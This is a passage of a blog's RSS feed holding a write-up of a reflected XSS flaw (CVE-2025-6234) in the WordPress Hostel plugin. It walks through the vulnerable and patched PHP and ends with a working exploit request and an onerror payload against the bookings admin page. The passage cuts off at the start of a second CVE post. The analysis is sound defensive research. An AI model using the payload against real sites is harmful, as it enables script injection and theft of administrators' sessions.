Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt; 1.1.5.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Hostel Plugin&lt;/strong&gt;: v1.1.5.7 (vulnerable) and v1.1.5.8 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt;: meld or any tool that can compare two versions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The root cause is the lack of &lt;strong&gt;sanitization&lt;/strong&gt; and &lt;strong&gt;escaping&lt;/strong&gt; for a parameter before rendering it on the page, leading to a &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable version and the patch.&#xA;The differences are clearly in two files: &lt;strong&gt;views/bookings.html.php&lt;/strong&gt; and &lt;strong&gt;controllers/bookings.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;File views/bookings.html.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;p align=&amp;#34;center&amp;#34;&amp;gt;&#xA;    &amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset - $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[previous page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt; &#xA;    &amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset &amp;#43; $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[next page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt;&#x9;&#xA;&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The parameter &lt;code&gt;ob&lt;/code&gt; is directly taken from &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; and echoed into an HTML attribute &lt;strong&gt;without escaping&lt;/strong&gt;, making it vulnerable to &lt;strong&gt;Reflected XSS&lt;/strong&gt;, since an attacker can inject payloads into the query string.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched Code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;p align=&amp;#34;center&amp;#34;&amp;gt;&#xA;    &amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset - $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo esc_attr($_GET[&amp;#39;ob&amp;#39;] ?? &amp;#39;&amp;#39;)?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[previous page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt; &#xA;    &amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset &amp;#43; $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo esc_attr($_GET[&amp;#39;ob&amp;#39;] ?? &amp;#39;&amp;#39;)?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[next page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt;&#x9;&#xA;&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch uses &lt;code&gt;esc_attr()&lt;/code&gt; to safely encode &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; before echoing into the HTML attribute.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/diff_code.png&#34; title=&#34;Diff showing patched and vulnerable code&#34; data-thumbnail=&#34;/posts/2025-10-02-cve-2025-6234/diff_code.png&#34; data-sub-html=&#34;&lt;h2&gt;diff&lt;/h2&gt;&lt;p&gt;Diff showing patched and vulnerable code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-02-cve-2025-6234/diff_code.png&#39; alt=&#34;diff&#34; height=&#34;261&#34; width=&#34;717&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff showing patched and vulnerable code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Source: &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; is &lt;strong&gt;client-controlled input&lt;/strong&gt; from the URL query string.&lt;/li&gt;&#xA;&lt;li&gt;Sink: echoed in an &lt;strong&gt;HTML attribute&lt;/strong&gt; &lt;code&gt;ob=&amp;lt;?php echo @$_GET[&#39;ob&#39;]?&amp;gt;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Because the source does not go through controller logic, the diff of &lt;strong&gt;controllers/bookings.php&lt;/strong&gt; is less relevant.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;For &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; to be echoed in the HTML attribute of &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;, the &lt;code&gt;if&lt;/code&gt; condition enclosing &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; must be true:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;// ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&#xA;&amp;lt;?php endif;?&amp;gt; &#xA;&amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;// ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&#xA;&amp;lt;?php endif;?&amp;gt;&#x9;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The key condition is &lt;code&gt;if($offset &amp;gt; 0)&lt;/code&gt;. If true, the XSS can occur regardless of the second condition.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;strong&gt;views/bookings.html.php&lt;/strong&gt; file cannot be accessed directly; it must be included by the &lt;strong&gt;controller&lt;/strong&gt; using &lt;code&gt;include()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;$offset&lt;/code&gt; variable is initialized in the controller and passed to the view.&lt;/p&gt;&#xA;&lt;p&gt;Searching the plugin controllers shows that &lt;code&gt;$offset&lt;/code&gt; is set in the &lt;code&gt;default&lt;/code&gt; branch (&lt;strong&gt;listing bookings&lt;/strong&gt;) of the static &lt;code&gt;manage()&lt;/code&gt; method in class &lt;code&gt;WPHostelBookings&lt;/code&gt; in &lt;strong&gt;controllers/bookings.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Controller Code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class WPHostelBookings {&#xA;    static function manage() {&#xA;        global $wpdb;&#xA;        $_booking = new WPHostelBooking();&#xA;&#xA;        switch(@$_GET[&amp;#39;do&amp;#39;]) {&#xA;            // other logic&#xA;            &#xA;            // list bookings&#xA;            default:&#xA;                $type = empty($_GET[&amp;#39;type&amp;#39;]) ? &amp;#39;upcoming&amp;#39; : sanitize_text_field($_GET[&amp;#39;type&amp;#39;]);&#xA;                $offset = empty($_GET[&amp;#39;offset&amp;#39;]) ? 0 : intval($_GET[&amp;#39;offset&amp;#39;]);&#xA;                $dir = empty($_GET[&amp;#39;dir&amp;#39;]) ? &amp;#39;ASC&amp;#39; : $_GET[&amp;#39;dir&amp;#39;];&#xA;                if($dir != &amp;#39;ASC&amp;#39; and $dir != &amp;#39;DESC&amp;#39;) $dir = &amp;#39;ASC&amp;#39;;&#xA;                $odir = ($dir == &amp;#39;ASC&amp;#39;) ? &amp;#39;DESC&amp;#39; : &amp;#39;ASC&amp;#39;;&#xA;                &#xA;                $page_limit = 20;&#xA;                $limit_sql = empty($_GET[&amp;#39;export&amp;#39;]) ? $wpdb-&amp;gt;prepare(&amp;#34;LIMIT %d, %d&amp;#34;, $offset, $page_limit) : &amp;#39;&amp;#39;; &#xA;                &#xA;                $bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;                    FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id&#xA;                    WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&#xA;                $count = $wpdb-&amp;gt;get_var(&amp;#34;SELECT FOUND_ROWS()&amp;#34;);&#x9;&#xA;                &#xA;                if(@file_exists(get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;)) include get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;;&#xA;                else include(WPHOSTEL_PATH.&amp;#34;/views/bookings.html.php&amp;#34;);&#x9;&#x9;&#x9;&#x9;  &#xA;            break;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Analysis of &lt;code&gt;$offset&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;$offset&lt;/code&gt; comes from the URL parameter &lt;code&gt;$_GET[&#39;offset&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Absent → defaults to 0&lt;/li&gt;&#xA;&lt;li&gt;Present → cast to integer via &lt;code&gt;intval()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$offset = empty($_GET[&amp;#39;offset&amp;#39;]) ? 0 : intval($_GET[&amp;#39;offset&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Analysis of &lt;code&gt;$page_limit&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$page_limit&lt;/code&gt; is fixed at &lt;code&gt;20&lt;/code&gt; for pagination&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$page_limit = 20;&#xA;$limit_sql = empty($_GET[&amp;#39;export&amp;#39;]) ? $wpdb-&amp;gt;prepare(&amp;#34;LIMIT %d, %d&amp;#34;, $offset, $page_limit) : &amp;#39;&amp;#39;; &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This ensures SQL returns up to &lt;strong&gt;20 records&lt;/strong&gt; starting from &lt;code&gt;$offset&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;XSS condition in view&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The payload displays only if &lt;code&gt;if($offset &amp;gt; 0)&lt;/code&gt; → requires at least &lt;strong&gt;1 offset&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Exploit requires at least &lt;strong&gt;2 bookings&lt;/strong&gt; in the database to render payload&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The controller passes results to the view using:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(@file_exists(get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;)) include get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;;&#xA;else include(WPHOSTEL_PATH.&amp;#34;/views/bookings.html.php&amp;#34;);&#x9;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;WPHOSTEL_PATH&lt;/code&gt; is the absolute path to the plugin directory.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/search_path.png&#34; title=&#34;Absolute path to the plugin directory&#34; data-thumbnail=&#34;/posts/2025-10-02-cve-2025-6234/search_path.png&#34; data-sub-html=&#34;&lt;h2&gt;search path&lt;/h2&gt;&lt;p&gt;Absolute path to the plugin directory&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-02-cve-2025-6234/search_path.png&#39; alt=&#34;search path&#34; height=&#34;329&#34; width=&#34;987&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Absolute path to the plugin directory&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Request with XSS payload&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=upcoming&amp;amp;offset=1&amp;amp;ob=&amp;#34;&amp;gt;&amp;lt;img&amp;#43;src%3D1&amp;#43;onerror%3Dalert%28document.domain%29&amp;gt; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Payload&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;&amp;gt;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Closes &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; tag with &lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Adds &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag with &lt;code&gt;onerror&lt;/code&gt; to trigger JavaScript&lt;/li&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;alert(document.domain)&lt;/code&gt; to clearly demonstrate DOM access&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/xss_success.png&#34; title=&#34;Reflected XSS triggered successfully&#34; data-thumbnail=&#34;/posts/2025-10-02-cve-2025-6234/xss_success.png&#34; data-sub-html=&#34;&lt;h2&gt;xss success&lt;/h2&gt;&lt;p&gt;Reflected XSS triggered successfully&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-02-cve-2025-6234/xss_success.png&#39; alt=&#34;xss success&#34; height=&#34;417&#34; width=&#34;961&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Reflected XSS triggered successfully&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-6234&lt;/strong&gt; vulnerability in the &lt;strong&gt;WordPress Hostel&lt;/strong&gt; plugin stems from improper handling of input &lt;code&gt;($_GET[&#39;ob&#39;])&lt;/code&gt; before rendering. This allows an attacker to inject &lt;strong&gt;Reflected XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The patch fixes it by using &lt;code&gt;esc_attr()&lt;/code&gt; to escape the input, ensuring untrusted values cannot inject malicious scripts.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always &lt;strong&gt;sanitize&lt;/strong&gt; input and &lt;strong&gt;escape&lt;/strong&gt; output according to context.&lt;/li&gt;&#xA;&lt;li&gt;In WordPress, leverage built-in functions like &lt;code&gt;sanitize_text_field()&lt;/code&gt;, &lt;code&gt;esc_attr()&lt;/code&gt;, &lt;code&gt;esc_html()&lt;/code&gt;, &lt;code&gt;wp_kses()&lt;/code&gt; to mitigate security risks.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;XSS Cross-site scripting (XSS) cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-plugin-1-1-5-8-reflected-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin &amp;lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2022-21661 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-01-cve-2022-21661/</link>
      <pubDate>Wed, 01 Oct 2025 12:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-01-cve-2022-21661/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Due to improper &lt;strong&gt;data sanitization&lt;/strong&gt; in &lt;code&gt;WP_Query&lt;/code&gt;, it is possible in certain cases to perform an &lt;strong&gt;SQL Injection&lt;/strong&gt; through &lt;strong&gt;plugins&lt;/strong&gt; or &lt;strong&gt;themes&lt;/strong&gt; that use it in a particular way. This vulnerability was patched in WordPress version &lt;strong&gt;5.8.3&lt;/strong&gt;. Older affected versions were also fixed through security releases going back as far as &lt;strong&gt;3.7.37&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a 